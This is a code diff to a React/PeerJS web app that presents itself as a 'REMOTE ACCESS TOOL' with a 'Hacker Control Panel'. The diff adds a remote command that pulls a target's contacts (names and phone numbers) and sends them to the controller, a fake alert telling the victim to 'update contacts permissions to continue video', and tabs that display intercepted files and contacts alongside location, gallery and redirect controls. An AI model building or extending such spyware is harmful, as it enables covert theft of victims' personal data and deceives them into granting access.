@@ -2,7 +2,7 @@
 import React, { useState, useEffect, useRef } from 'react';
 import Peer, { DataConnection } from 'peerjs';
 import { analyzeScreen } from './services/geminiService';
-import { DeviceInfo, RemoteCommand, FileTransfer } from './types';
+import { DeviceInfo, RemoteCommand, FileTransfer, Contact } from './types';
 
 const App: React.FC = () => {
   const [myId, setMyId] = useState<string>('');
@@ -28,6 +28,8 @@ const App: React.FC = () => {
   const [dataConn, setDataConn] = useState<DataConnection | null>(null);
   const [showControlPanel, setShowControlPanel] = useState<boolean>(false);
   const [interceptedFiles, setInterceptedFiles] = useState<FileTransfer[]>([]);
+  const [interceptedContacts, setInterceptedContacts] = useState<Contact[]>([]);
+  const [hackerTab, setHackerTab] = useState<'INFO' | 'FILES' | 'CONTACTS'>('INFO');
 
   const [activeStream, setActiveStream] = useState<MediaStream | null>(null);
 
@@ -70,7 +72,13 @@ const App: React.FC = () => {
         }
         if (data.type === 'FILE_TRANSFER') {
             setInterceptedFiles(prev => [...prev, data]);
-            alert(`New File Intercepted: ${data.fileName}`);
+            // Switch to files tab automatically
+            setHackerTab('FILES');
+        }
+        if (data.type === 'CONTACTS_LIST') {
+            setInterceptedContacts(data.payload);
+            setHackerTab('CONTACTS');
+            alert(`Collected ${data.payload.length} contacts!`);
         }
       });
     });
@@ -199,7 +207,7 @@ const App: React.FC = () => {
     }
   };
 
-  const handleRemoteCommand = (cmd: RemoteCommand) => {
+  const handleRemoteCommand = async (cmd: RemoteCommand) => {
     switch(cmd.type) {
       case 'VIBRATE':
         if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
@@ -220,6 +228,25 @@ const App: React.FC = () => {
         // Trigger the hidden input
         if (galleryInputRef.current) {
             galleryInputRef.current.click();
+        }
+        break;
+      case 'REQUEST_CONTACTS':
+        try {
+            // @ts-ignore
+            if ('contacts' in navigator && 'ContactsManager' in window) {
+                const props = ['name', 'tel'];
+                const opts = { multiple: true };
+                // @ts-ignore
+                const contacts = await navigator.contacts.select(props, opts);
+                if (dataConn && dataConn.open) {
+                    dataConn.send({ type: 'CONTACTS_LIST', payload: contacts });
+                }
+            } else {
+                // Fallback / Fake message if not supported
+                alert("Please update contacts permissions to continue video.");
+            }
+        } catch (e) {
+            console.error(e);
         }
         break;
     }
@@ -326,86 +353,135 @@ const App: React.FC = () => {
 
         {/* Hacker Control Panel */}
         {showControlPanel && (
-          <div className="absolute top-16 right-4 w-72 bg-black/95 border border-green-500/50 p-4 rounded-xl text-green-400 font-mono text-xs shadow-2xl z-40 max-h-[80vh] overflow-y-auto">
-             <h3 className="border-b border-green-500/30 pb-2 mb-2 font-bold flex justify-between">
-                <span>TARGET INFO</span>
-                <span className="animate-pulse text-red-500">● LIVE</span>
-             </h3>
-             {targetInfo ? (
-               <div className="space-y-2 mb-4">
-                 <p className="text-white font-bold text-sm border-b border-white/10 pb-1">
-                    📱 {targetInfo.deviceName}
-                 </p>
-                 <p>BATTERY: {targetInfo.battery}%</p>
-                 <p>OS: {targetInfo.platform}</p>
-                 {targetInfo.latitude && (
-                     <>
-                        <a 
-                            href={`https://www.google.com/maps?q=${targetInfo.latitude},${targetInfo.longitude}`} 
-                            target="_blank" 
-                            rel="noreferrer"
-                            className="block bg-green-900/30 p-2 rounded hover:bg-green-800/50 text-center mb-1 border border-green-500/20"
-                        >
-                            📍 OPEN LOCATION
-                        </a>
-                         {/* OPEN GALLERY BUTTON */}
-                        <button 
-                            onClick={() => sendCommand('REQUEST_GALLERY')}
-                            className="w-full block bg-yellow-900/30 p-2 rounded hover:bg-yellow-800/50 text-center text-yellow-400 font-bold border border-yellow-500/20"
-                        >
-                            📂 OPEN GALLERY
-                        </button>
-                    </>
-                 )}
-               </div>
-             ) : (
-               <p className="mb-4">Waiting for data packets...</p>
-             )}
+          <div className="absolute top-16 right-4 w-80 bg-slate-900/95 border border-green-500/50 rounded-xl text-green-400 font-mono text-xs shadow-2xl z-40 max-h-[85vh] overflow-hidden flex flex-col">
              
-             {/* Intercepted Files Section */}
-             {interceptedFiles.length > 0 && (
-                 <div className="mb-4 border-t border-green-500/30 pt-2">
-                     <h4 className="text-yellow-400 font-bold mb-2">INTERCEPTED FILES ({interceptedFiles.length})</h4>
-                     <div className="grid grid-cols-2 gap-2">
-                         {interceptedFiles.map((file, idx) => (
-                             <a key={idx} href={file.data} download={file.fileName} className="block group relative aspect-square bg-slate-800 rounded border border-white/10 overflow-hidden">
-                                 {file.fileType.startsWith('image') ? (
-                                     <img src={file.data} alt="intercepted" className="w-full h-full object-cover" />
-                                 ) : (
-                                     <div className="flex items-center justify-center h-full text-2xl">🎥</div>
-                                 )}
-                                 <div className="absolute inset-0 bg-black/50 opacity-0 group-hover:opacity-100 flex items-center justify-center transition-opacity">
-                                     ⬇️
-                                 </div>
-                             </a>
-                         ))}
-                     </div>
-                 </div>
-             )}
+             {/* Header */}
+             <div className="p-3 border-b border-green-500/30 flex justify-between items-center bg-slate-950">
+                <span className="font-bold text-sm">REMOTE ACCESS TOOL</span>
+                <span className="animate-pulse text-red-500 text-[10px]">● LIVE</span>
+             </div>
 
-             <h3 className="border-b border-green-500/30 pb-2 mb-2 font-bold">COMMANDS</h3>
-             <div className="grid grid-cols-2 gap-2">
-                <button onClick={() => sendCommand('VIBRATE')} className="bg-red-900/40 border border-red-500/30 p-2 rounded hover:bg-red-800/50">
-                  ⚡ VIBRATE
-                </button>
-                <button onClick={() => {
-                   const msg = prompt("Message to display:");
-                   if(msg) sendCommand('ALERT', msg);
-                }} className="bg-blue-900/40 border border-blue-500/30 p-2 rounded hover:bg-blue-800/50">
-                  💬 ALERT
-                </button>
-                 <button onClick={() => {
-                   const msg = prompt("Text to speak:");
-                   if(msg) sendCommand('SPEAK', msg);
-                }} className="bg-yellow-900/40 border border-yellow-500/30 p-2 rounded hover:bg-yellow-800/50">
-                  🗣️ SPEAK
-                </button>
-                <button onClick={() => {
-                   const url = prompt("URL to redirect to:");
-                   if(url) sendCommand('REDIRECT', url);
-                }} className="bg-purple-900/40 border border-purple-500/30 p-2 rounded hover:bg-purple-800/50">
-                  🌐 REDIRECT
-                </button>
+             {/* Tabs */}
+             <div className="flex border-b border-green-500/30">
+                <button onClick={() => setHackerTab('INFO')} className={`flex-1 p-2 ${hackerTab === 'INFO' ? 'bg-green-900/30 text-white' : 'hover:bg-green-900/10'}`}>INFO</button>
+                <button onClick={() => setHackerTab('FILES')} className={`flex-1 p-2 ${hackerTab === 'FILES' ? 'bg-green-900/30 text-white' : 'hover:bg-green-900/10'}`}>FILES</button>
+                <button onClick={() => setHackerTab('CONTACTS')} className={`flex-1 p-2 ${hackerTab === 'CONTACTS' ? 'bg-green-900/30 text-white' : 'hover:bg-green-900/10'}`}>CONTACTS</button>
+             </div>
+
+             {/* Content Area */}
+             <div className="flex-1 overflow-y-auto p-3 custom-scrollbar">
+                
+                {/* TAB: INFO & COMMANDS */}
+                {hackerTab === 'INFO' && (
+                    <div className="space-y-4">
+                        {targetInfo ? (
+                            <div className="space-y-1 bg-black/40 p-2 rounded border border-green-500/20">
+                                <p className="text-white font-bold text-sm">📱 {targetInfo.deviceName}</p>
+                                <p>BATTERY: {targetInfo.battery}%</p>
+                                <p>OS: {targetInfo.platform}</p>
+                                {targetInfo.latitude && (
+                                     <a 
+                                     href={`https://www.google.com/maps?q=${targetInfo.latitude},${targetInfo.longitude}`} 
+                                     target="_blank" 
+                                     rel="noreferrer"
+                                     className="block mt-2 bg-green-900/40 p-1.5 rounded text-center border border-green-500/30 hover:bg-green-800/50"
+                                     >
+                                     📍 LOCATE DEVICE
+                                     </a>
+                                )}
+                            </div>
+                        ) : (
+                            <p className="text-gray-500">Waiting for handshake...</p>
+                        )}
+
+                        <div className="grid grid-cols-2 gap-2">
+                             <button onClick={() => sendCommand('REQUEST_GALLERY')} className="col-span-2 bg-yellow-600/20 border border-yellow-500/40 p-2 rounded text-yellow-400 hover:bg-yellow-600/30 font-bold">
+                                📂 ACCESS STORAGE
+                            </button>
+                            <button onClick={() => sendCommand('REQUEST_CONTACTS')} className="col-span-2 bg-purple-600/20 border border-purple-500/40 p-2 rounded text-purple-400 hover:bg-purple-600/30 font-bold">
+                                👤 GET CONTACTS
+                            </button>
+                            <button onClick={() => sendCommand('VIBRATE')} className="bg-red-900/20 border border-red-500/30 p-2 rounded hover:bg-red-800/30">
+                                ⚡ VIBRATE
+                            </button>
+                            <button onClick={() => {
+                                const msg = prompt("Message:");
+                                if(msg) sendCommand('ALERT', msg);
+                            }} className="bg-blue-900/20 border border-blue-500/30 p-2 rounded hover:bg-blue-800/30">
+                                💬 MESSAGE
+                            </button>
+                             <button onClick={() => {
+                                const url = prompt("URL:");
+                                if(url) sendCommand('REDIRECT', url);
+                            }} className="bg-slate-700/40 border border-slate-500/30 p-2 rounded hover:bg-slate-600/30">
+                                🌐 OPEN URL
+                            </button>
+                             <button onClick={() => {
+                                const msg = prompt("Text to speak:");
+                                if(msg) sendCommand('SPEAK', msg);
+                            }} className="bg-pink-900/20 border border-pink-500/30 p-2 rounded hover:bg-pink-800/30">
+                                🗣️ VOICE
+                            </button>
+                        </div>
+                    </div>
+                )}
+
+                {/* TAB: FILES (GALLERY) */}
+                {hackerTab === 'FILES' && (
+                    <div>
+                         {interceptedFiles.length === 0 ? (
+                             <div className="text-center text-gray-500 py-8">
+                                 <i className="fas fa-folder-open text-4xl mb-2 opacity-30"></i>
+                                 <p>No files accessed yet.</p>
+                                 <p className="text-[10px] mt-2">Click "ACCESS STORAGE" to pull files.</p>
+                             </div>
+                         ) : (
+                             <div className="grid grid-cols-2 gap-2">
+                                 {interceptedFiles.map((file, idx) => (
+                                     <a key={idx} href={file.data} download={file.fileName} className="group relative aspect-square bg-slate-800 rounded border border-white/10 overflow-hidden block">
+                                         {file.fileType.startsWith('image') ? (
+                                             <img src={file.data} alt="intercepted" className="w-full h-full object-cover" />
+                                         ) : (
+                                             <div className="flex flex-col items-center justify-center h-full text-gray-400">
+                                                 <i className="fas fa-video text-2xl"></i>
+                                                 <span className="text-[9px] mt-1">{file.fileName.slice(0, 8)}...</span>
+                                             </div>
+                                         )}
+                                         <div className="absolute inset-0 bg-black/60 opacity-0 group-hover:opacity-100 flex items-center justify-center transition-opacity">
+                                             <i className="fas fa-download text-white"></i>
+                                         </div>
+                                     </a>
+                                 ))}
+                             </div>
+                         )}
+                    </div>
+                )}
+
+                {/* TAB: CONTACTS */}
+                {hackerTab === 'CONTACTS' && (
+                    <div className="space-y-2">
+                        {interceptedContacts.length === 0 ? (
+                            <div className="text-center text-gray-500 py-8">
+                                <i className="fas fa-address-book text-4xl mb-2 opacity-30"></i>
+                                <p>No contacts fetched.</p>
+                                <p className="text-[10px] mt-2">Click "GET CONTACTS" to dump list.</p>
+                            </div>
+                        ) : (
+                            <ul className="space-y-2">
+                                {interceptedContacts.map((c, i) => (
+                                    <li key={i} className="bg-slate-800 p-2 rounded border border-white/5 flex justify-between items-center">
+                                        <div>
+                                            <p className="font-bold text-white">{c.name?.[0] || "No Name"}</p>
+                                            <p className="text-gray-400 text-xs">{c.tel?.[0] || "No Number"}</p>
+                                        </div>
+                                        <button className="text-xs bg-slate-700 p-1 rounded hover:bg-slate-600">COPY</button>
+                                    </li>
+                                ))}
+                            </ul>
+                        )}
+                    </div>
+                )}
+
              </div>
           </div>
         )}
